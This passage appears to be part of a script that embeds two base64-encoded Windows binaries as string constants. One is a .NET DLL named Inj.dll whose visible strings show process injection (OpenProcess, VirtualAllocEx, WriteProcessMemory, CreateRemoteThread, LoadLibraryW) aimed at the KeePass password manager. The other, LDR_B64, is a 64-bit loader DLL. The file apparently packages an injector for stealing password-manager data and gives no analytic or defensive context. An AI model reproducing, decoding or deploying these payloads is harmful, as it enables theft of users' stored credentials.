    "AACAAJEgVwBbAA4AAAAAAIAAkSB4AGcAFQAAAAAAgACRIIkAbQAXAAAAAACAAJEgmQByABgAWCAA"
    "AAAAlgC5AXgAGgAAAAEAJQAAAAIAJwAAAAMAKQAAAAEAOgAAAAIAJQAAAAMAPAAAAAQAPgAAAAUA"
    "QAAAAAEAOgAAAAIAJQAAAAMAJwAAAAQAPAAAAAUAVQAAAAEAOgAAAAIAagAAAAMAbQAAAAQAcAAA"
    "AAUAQAAAAAYAcwAAAAcAdQAAAAEAOgAAAAIAhwAAAAEAhwAAAAEAOgAAAAIArQAAAAEAsAAJAMcA"
    "AQAJANgABgARAPsADAAZABMBEwARACABGQApADsBHQAxAEkBJAAxAE4BJwAZAFoBEwA5AH0BLQAp"
    "ADsBBgA5AIkBMgBRAKoBOABRALMBPABZALMBPAAuAHsAkQB9ABwAAAEFABAAAQAAAQcAKwABAAAB"
    "CQBCAAEAAAELAFcAAQAAAQ0AeAABAAABDwCJAAEAAAERAJkAAQAEgAAAAAAAAAAAAAAAAAAAAAAK"
    "AAAABAAAAAAAAAAAAAAAsAD7AQAAAAAEAAAAAAAAAAAAAACwAC0BAAAAAAAAAAAAPE1vZHVsZT4A"
    "SW5qAEkAT3BlblByb2Nlc3MAa2VybmVsMzIAYQBiAGMAVmlydHVhbEFsbG9jRXgAaABzAHQAcABX"
    "cml0ZVByb2Nlc3NNZW1vcnkAdwBDcmVhdGVSZW1vdGVUaHJlYWQAc2EAc3MAZm4AZgBpZABHZXRQ"
    "cm9jQWRkcmVzcwBuAEdldE1vZHVsZUhhbmRsZQBXYWl0Rm9yU2luZ2xlT2JqZWN0AG1zAGRsbFBh"
    "dGgAUGF0aABTeXN0ZW0uSU8AR2V0RGlyZWN0b3J5TmFtZQBDb21iaW5lAFByb2Nlc3MAU3lzdGVt"
    "LkRpYWdub3N0aWNzAEdldFByb2Nlc3Nlc0J5TmFtZQBGaWxlAFdyaXRlQWxsVGV4dABnZXRfSWQA"
    "SW50MzIAU3lzdGVtAFN0cmluZwBDb25jYXQASW50UHRyAFplcm8Ab3BfRXF1YWxpdHkAQXBwZW5k"
    "QWxsVGV4dABFbmNvZGluZwBTeXN0ZW0uVGV4dABnZXRfVW5pY29kZQBHZXRCeXRlcwBVSW50MzIA"
    "RXhjZXB0aW9uAE9iamVjdABUb1N0cmluZwAuY3RvcgBSdW4AUnVudGltZUNvbXBhdGliaWxpdHlB"
    "dHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBtc2NvcmxpYgBJbmouZGxs"
    "AAAXaQBuAGoAXwBsAG8AZwAuAHQAeAB0AAAPSwBlAGUAUABhAHMAcwAAFW4AbwAgAGsAZQBlAHAA"
    "YQBzAHMAAAlwAGkAZAA6AAAFDQAKAAAXbwBwAGUAbgAgAGYAYQBpAGwADQAKAAATbwBwAGUAbgAg"
    "AG8AawANAAoAAAMAAAAZYQBsAGwAbwBjACAAZgBhAGkAbAANAAoAAA1hAGwAbABvAGMAOgAADXcA"
    "cgBvAHQAZQA6AAARawBlAHIAbgBlAGwAMwAyAAAZTABvAGEAZABMAGkAYgByAGEAcgB5AFcAAAds"
    "AGwAOgAAG3QAaAByAGUAYQBkACAAZgBhAGkAbAANAAoAABd0AGgAcgBlAGEAZAAgAG8AawANAAoA"
    "AA1kAG8AbgBlAA0ACgAAB2UAeAA6AAAAiV+r7irDOkCbpueCoKSxXgAEAAEODgUAAg4ODgYAAR0S"
    "CQ4FAAIBDg4DIAAIBgADDhwcHAIGGAUAAgIYGAQAABIdBSABHQUOAyAADgMgAAEGAAMYCQIICAAF"
    "GBgYCQkJCgAFAhgYHQUJEAkLAAcYGBgJGBgJEAkFAAIYGA4EAAEYDgUAAgkYCQQAAQgOEwcNDh0S"
    "CQgIGB0FGAkYGAkYEiUeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCLd6XFYZNOCJAAAA"
    "AAAAAAAAAAAAAAAAyCkAAAAAAAAAAAAA3ikAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAANApAAAA"
    "AAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAAB"
    "AAAAAABIAAAAWEAAAHgCAAAAAAAAAAAAAHgCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4A"
    "RgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAA"
    "AAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQA"
    "aQBvAG4AAAAAAH8AsATYAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAAC0AQAAAQAw"
    "ADAANwBmADAANABiADAAAAAcAAIAAQBDAG8AbQBtAGUAbgB0AHMAAAAgAAAAJAACAAEAQwBvAG0A"
    "cABhAG4AeQBOAGEAbQBlAAAAAAAgAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBv"
    "AG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAA"
    "AAAoAAQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEkAbgBqAAAAKAACAAEATABlAGcAYQBs"
    "AEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAACwAAgABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIA"
    "awBzAAAAAAAgAAAAOAAIAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEkAbgBq"
    "AC4AZABsAGwAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQAHIA"
    "bwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA"
    "8DkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
)
LDR_B64 = (
    "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"
    "CQBILQAQAABIPQAQAAB350gpwUiDCQBYWcOQkJCQkJCQkJCQkJCQkFZTSIPsKEiJy0iJ1kg50XMm"
    "Dx9AAGZmLg8fhAAAAAAASIsDSIXAdAb/0IXAdQtIg8MISDnzcukxwEiDxChbXsNTSIPsIInL6HQB"
    "AACJ2UiNFElIweIESAHQSIPEIFvDkEiFyXQSZg/vwDHASMdBEAAAAAAPEQHDuP/////DDx8AVlNI"
    "g+w4SInLSInWSIXJD4SrAAAAuQgAAADoOQEAAEiDOwB0W0iLQwhIi1MQSDnQdB5IjVAIuQgAAABI"
    "iVMISIkw6BkBAAAxwEiDxDhbXsNIiwtIKchIjRQASIlEJCjoNAEAAEiFwHQ/TItEJChIiQNMAcBJ"
    "AcBMiUMQ67UPHwC6CAAAALkgAAAA6OEAAABIiQNIhcB0EUiNkAABAABIiUMISIlTEOuFuQgAAADo"
    "rgAAAA8fAGZmLg8fhAAAAAAAuP/////rgmYPH4QAAAAAAFdWU0iD7CBIic+5CAAAAOh0AAAASIs3"
    "Zg/vwEiLXwhIx0cQAAAAALkIAAAADxEH6FwAAABIhfZ0JEiD6whIOfNyE0iLA0iFwHTv/9BIg+sI"
    "SDnzc+1IifHoUwAAADHASIPEIFteX8OQkJCQkJCQkJD/JYJpAACQkP8lgmkAAJCQ/yWCaQAAkJD/"
    "JYJpAACQkP8lgmkAAJCQ/yWCaQAAkJD/JYJpAACQkP8lgmkAAJCQ/yWCaQAAkJD/JYJpAACQkP8l"
    "gmkAAJCQ/yWCaQAAkJD/JYJpAACQkP8lgmkAAJCQ/yWCaQAAkJD/JYJpAACQkP8lgmkAAJCQDx+E"
    "AAAAAAD/JeJoAACQkP8l0mgAAJCQ/yXCaAAAkJD/JbJoAACQkP8lomgAAJCQ/yWSaAAAkJD/JYJo"
    "AACQkP8lcmgAAJCQ/yViaAAAkJD/JVJoAACQkP8lQmgAAJCQ/yUyaAAAkJD/JSJoAACQkP8lEmgA"
    "AJCQ/yUCaAAAkJD/JfJnAACQkP8l4mcAAJCQ/yXSZwAAkJD/JfpoAACQkP8l6mgAAJCQ6Wvp//+Q"
    "kJCQkJCQkJCQkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAA"
    "AIBGFZQDAAAAAAAAAAAAAAD//////////wAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAOAmFZQDAAAA"
    "AAAAAAAAAAAgJxWUAwAAAAAAAAAAAAAAMCgVlAMAAABgJxWUAwAAAEAnFZQDAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
